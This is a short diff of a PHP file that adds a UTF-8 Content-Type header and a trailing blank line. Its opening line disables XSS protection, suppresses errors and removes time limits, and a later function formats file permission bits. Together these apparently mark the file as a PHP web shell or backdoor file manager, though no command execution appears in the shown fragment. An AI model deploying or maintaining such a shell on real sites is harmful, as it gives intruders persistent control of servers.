@@ -1,4 +1,4 @@
- <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);
+ <?php header("X-XSS-Protection: 0");ob_start();set_time_limit(0);error_reporting(0);ini_set('display_errors', FALSE);header("Content-Type: text/html; charset=utf-8");
 echo '<html>
 <center>
 <body>
@@ -206,4 +206,5 @@ $info .= (($z & 0x0001) ?
 (($z & 0x0200) ? 'T' : '0'));
 return $info;
 }
+
 ?>
